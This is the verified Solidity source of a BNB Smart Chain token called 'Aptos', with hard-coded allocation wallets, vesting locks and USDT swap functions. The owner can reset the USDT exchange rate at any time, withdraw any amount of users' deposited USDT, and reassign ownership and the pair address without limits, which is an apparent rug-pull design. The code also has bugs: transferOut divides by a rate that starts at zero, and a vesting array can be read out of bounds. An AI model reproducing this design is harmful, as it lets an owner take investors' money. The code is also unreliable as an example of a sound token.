/**
 *Submitted for verification at BscScan.com on 2022-05-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-28
*/

//coin 
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public _owner;

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
	
	function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract Aptos is IERC20, Ownable {
    IERC20 usdt;
    using SafeMath for uint256;

    uint256 public _usdtRate = 0;
    event eveSetRate(uint256 usdt_rate);

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => address) inviter;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    uint256 private _destroyMaxAmount;
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    
    address tokenOwner = address(0x1dD71eEA7a14028C84c9142C18e2853F0f741d51);

    address tokenReserved = address(0xD37600ADB351FA64a169fad2C4C2a003fa568422);

    address tokenNode = address(0x4E0E1265Cbc097AcDce708eD14DC35C503E981df);

    address tokenTechnologyLuck = address(0x64CFefb60bb8dA6273dddAF8EcBFD8bcD2f2FFf5);

    address tokenOwnerLuck = address(0xED477Bf8463E32df4d3Fafa99aC93D974663cf7e);

    address tokenFoundingTeam = address(0x1f91C766661Bd128E3BB10bEFFa08DC036248998);

    address tokenDefi = address(0xE0Ebc2D2b474219c16E6DD080fbD6d835F406458);

    address tokenDrop = address(0x371bE97D7643C846c9238d32E95b88D7f11cb4B4);

    address tokenPrivate = address(0xF1c0e968Bd667B5Bb224088cA66616532F48dbf3);

    mapping(address => uint256) private _luckAmount;
    mapping(address => uint256) private _luckTime;
    mapping(address => uint256) private _luckAmount2;
    mapping(address => uint256) private _luckTime2;

    uint256[] public releaseRate = [100,80,60,40,30,20,10];
    uint256[] public releaseRate2 = [100,70,45,25,10];
    address public uniswapV2Pair;
    uint256 public startTime;
    bool public swapAction = true;

    constructor(IERC20 _usdt) {
        usdt = _usdt;

        _name = "Aptos";
        _symbol = "Aptos";
        _decimals = 18;
        _tTotal = 99999 * 10**_decimals;
        
        _rTotal = (MAX - (MAX % _tTotal));

        _rOwned[tokenPrivate] = _rTotal.div(100).mul(50);
        _rOwned[tokenDrop] = _rTotal.div(100).mul(1);
        _rOwned[tokenDefi] = _rTotal.div(100).mul(14);
        _rOwned[tokenFoundingTeam] = _rTotal.div(100).mul(10);
        _rOwned[tokenOwnerLuck] = _rTotal.div(100).mul(5);
        _rOwned[tokenTechnologyLuck] = _rTotal.div(100).mul(5);
        _rOwned[tokenReserved] = _rTotal.div(100).mul(5);
        _rOwned[tokenNode] = _rTotal.div(100).mul(10);

        _owner = msg.sender;

        _luckAmount2[tokenTechnologyLuck] = _luckAmount2[tokenTechnologyLuck].add(_tTotal.div(100).mul(5));
        _luckTime2[tokenTechnologyLuck] = block.timestamp;

        _luckAmount[tokenOwnerLuck] = _luckAmount[tokenOwnerLuck].add(_tTotal.div(100).mul(5));
        _luckTime[tokenOwnerLuck] = block.timestamp;

        emit Transfer(address(0), tokenPrivate, _tTotal.div(100).mul(50));
        emit Transfer(address(0), tokenDrop, _tTotal.div(100).mul(1));
        emit Transfer(address(0), tokenDefi, _tTotal.div(100).mul(14));
        emit Transfer(address(0), tokenFoundingTeam, _tTotal.div(100).mul(10));
        emit Transfer(address(0), tokenOwnerLuck, _tTotal.div(100).mul(5));
        emit Transfer(address(0), tokenTechnologyLuck, _tTotal.div(100).mul(5));
        emit Transfer(address(0), tokenReserved, _tTotal.div(100).mul(5));
        emit Transfer(address(0), tokenNode, _tTotal.div(100).mul(10));
    }

    function transferOut(uint256 amount)
        public
        returns (bool)
    {
        uint256 u_amount = amount / _usdtRate;
        usdt.transfer(msg.sender, u_amount);
        _transfer(msg.sender, address(this), amount);
        return true;
    }

    function transferIn(uint256 amount) public {
        uint256 aptos = amount * _usdtRate;
        require(usdt.transferFrom(msg.sender ,address(this) ,amount));
        _transfer(address(this), msg.sender, aptos);
    }

    function setRate(uint256 usdt_rate) public 
        onlyOwner 
    {
        _usdtRate = usdt_rate;

        emit eveSetRate(usdt_rate);
    }

    function withdrawal(uint256 amount) external payable onlyOwner{
	    usdt.transfer(_owner,amount);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
		if(uniswapV2Pair == address(0) && amount >= _tTotal.div(100)){
			uniswapV2Pair = recipient;
		}
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
	
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
    
	function changeswapAction() public onlyOwner{
        swapAction = !swapAction;
    }
	
    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
	
	function uniswapV2PairSync() public returns(bool){
        (bool success, ) = uniswapV2Pair.call(abi.encodeWithSelector(0xfff6cae9));
        return success;
    }
	
    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
	
	function getInviter(address account) public view returns (address) {
        return inviter[account];
    }
    

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if(_luckTime[from] > 0){
            uint256 startLuckTime = _luckTime[from];
            uint256 afterm = (block.timestamp.sub(startLuckTime)).div(86400*30);
            uint256 leaveAmount = _luckAmount[from];

            if(afterm >= 6){
                leaveAmount = 0;
            }else{
                leaveAmount = _luckAmount[from].div(100).mul(releaseRate2[afterm]);
            }
            require(balanceOf(from).sub(amount) >= leaveAmount);
        }

        if(_luckTime2[from] > 0){
            uint256 startLuckTime = _luckTime2[from];
            uint256 afterm = (block.timestamp.sub(startLuckTime)).div(86400*30);
            uint256 leaveAmount = _luckAmount2[from];

            if(afterm >= 8){
                leaveAmount = 0;
            }else{
                leaveAmount = _luckAmount2[from].div(100).mul(releaseRate[afterm]);
            }
            require(balanceOf(from).sub(amount) >= leaveAmount);
        }

        _tokenTransfer(from, to, amount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 recipientRate = 100;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }

    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
    }
}